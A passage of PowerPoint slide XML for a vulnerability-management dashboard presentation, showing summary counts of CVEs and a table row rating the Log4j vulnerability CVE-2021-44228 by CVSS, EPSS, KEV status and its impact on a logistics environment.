              <a:t>MITIGATED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="TextBox 123"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="5330952"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sec-team</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="TextBox 124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="5330952"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Migrated to AES-256-GCM. Key rotation policy set to 90 days.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Rectangle 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6144768"/>
            <a:ext cx="11731752" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="191303"/>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365760" y="6236208"/>
            <a:ext cx="11457432" cy="338328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Risk scores recalculate automatically: patching CVE-2021-44228 would drop R-001 from score 25 to score 4. Risk owners are notified by email at the review_date. Each risk links to the relevant vulnerability, asset, and incident — so a single click shows the full picture. The heat map view (Likelihood × Impact grid) provides a visual summary for board-level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Vulnerabilities</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Full CVE inventory — CVSS · EPSS exploit probability · CISA KEV status · MITRE mapping · blast radius</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Vulnerabilities page is the primary workspace for security engineers. It lists every CVE discovered across all assets in GlobalShip Logistics' environment, enriched with five data sources: CVSS v3 severity from NVD, EPSS exploit probability from FIRST.org (the chance the CVE will be actively exploited in the next 30 days), CISA KEV status (whether the US government has confirmed active exploitation in the wild), MITRE ATT&amp;CK technique mapping, and a human-readable blast radius description specific to the logistics environment. Filters let engineers triage by severity, status, environment, and exploit-verified flags.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2148840"/>
            <a:ext cx="2194560" cy="749808"/>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19456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40280"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Total CVEs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2423160"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All logistics assets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514600" y="2148840"/>
            <a:ext cx="219456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4600" y="2148840"/>
            <a:ext cx="219456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24328" y="2240280"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL (9+)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2624328" y="2423160"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2624328" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Immediate P0 action</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="2148840"/>
            <a:ext cx="219456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00600" y="2148840"/>
            <a:ext cx="219456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10328" y="2240280"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CISA KEV</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4910328" y="2423160"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4910328" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confirmed wild exploits</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2148840"/>
            <a:ext cx="219456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86600" y="2148840"/>
            <a:ext cx="219456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96328" y="2240280"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EPSS &gt; 90%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7196328" y="2423160"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7196328" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Near-certain exploitation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9372600" y="2148840"/>
            <a:ext cx="2377440" cy="749808"/>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148840"/>
            <a:ext cx="237744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82328" y="2240280"/>
            <a:ext cx="2157984" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patched</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9482328" y="2423160"/>
            <a:ext cx="2157984" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9482328" y="2679192"/>
            <a:ext cx="2157984" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Merge verified via re-sim</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="299008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26664"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  CVE Table — Ranked by Exploit Priority (EPSS Descending)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3264408"/>
            <a:ext cx="1197864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10128"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="3310128"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="3310128"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EPSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="3310128"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>KEV</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="3310128"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="3310128"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE TECHNIQUES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="3310128"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BLAST RADIUS — LOGISTICS CONTEXT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3520440"/>
            <a:ext cx="1197864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2608" y="3557016"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-44228</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="3557016"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2258568" y="3557016"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>97.5%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2852928" y="3557016"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="3557016"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IN PROG</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4315968" y="3557016"/>
            <a:ext cx="1828800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1190 · T1059 · T1027</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6236208" y="3557016"/>
            <a:ext cx="5943600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CRITICAL — Log4j JNDI injection gives shell on ERPNext. All 10M shipment records accessible.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Rectangle 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3758184"/>
            <a:ext cx="1197864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92608" y="3794760"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
